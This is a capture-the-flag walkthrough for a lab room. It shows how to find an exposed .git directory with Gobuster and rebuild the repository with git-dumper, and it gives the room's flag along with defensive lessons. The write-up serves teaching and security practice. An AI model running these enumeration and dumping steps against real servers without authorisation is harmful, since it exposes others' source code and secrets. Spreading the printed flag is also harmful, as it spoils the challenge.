# Walkthrough – Byte Lotus: Room 404 Writeup (Directory Enumeration)

## Objective

Recover the exposed source code from the web server and locate the hidden flag.

---

## Step 1 – Read the Challenge Description

The challenge description contains several important clues:

* **"Port 8080 is wide open."**

  * The application is hosted on **port 8080** instead of the default HTTP port.

* **"The rooms it never lists are the ones worth finding."**

  * This hints that hidden directories or files exist and must be discovered through directory enumeration.

* **"The night-shift developer shipped more than the website."**

  * This suggests that development files or source code were accidentally deployed to production.

The objective also explicitly states:

> Dump the exposed source code.

---

## Step 2 – Enumerate Hidden Directories

Use a directory enumeration tool such as Gobuster.

```bash
gobuster dir \
-u http://10.49.134.47:8080 \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Among the discovered paths is:

```
/.git/
```

---

## Step 3 – Verify the Git Repository

Access the Git metadata:

```
http://10.49.134.47:8080/.git/HEAD
```

The response is:

```
ref: refs/heads/main
```

This confirms that the `.git` directory is publicly accessible.

Retrieve the latest commit hash:

```
http://10.49.134.47:8080/.git/refs/heads/main
```

Response:

```
0f13550b4cb13e9f30c61d5b342c532d21e45bda
```

This indicates the Git repository can likely be reconstructed.

---

## Step 4 – Recover the Repository

Use **git-dumper** to download the exposed Git repository.

```bash
git-dumper http://10.49.134.47:8080/.git recovered_repo
```

After completion, inspect the recovered repository.

```
cd recovered_repo
ls
```

---

## Step 5 – Inspect the Source Code

Open the project files.

The file `README.md` contains:

```text
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch):
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

## Flag

```text
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

# Learning Points

* Use directory enumeration to discover hidden resources.
* An exposed `.git` directory is a serious security vulnerability because it can reveal the application's full source code.
* The `HEAD` file identifies the current branch, while `refs/heads/<branch>` points to the latest commit.
* Tools such as **git-dumper** can reconstruct an exposed Git repository, allowing an attacker to inspect source code, configuration files, secrets, and historical commits.
* Always remove or block access to version control metadata before deploying a web application to production.
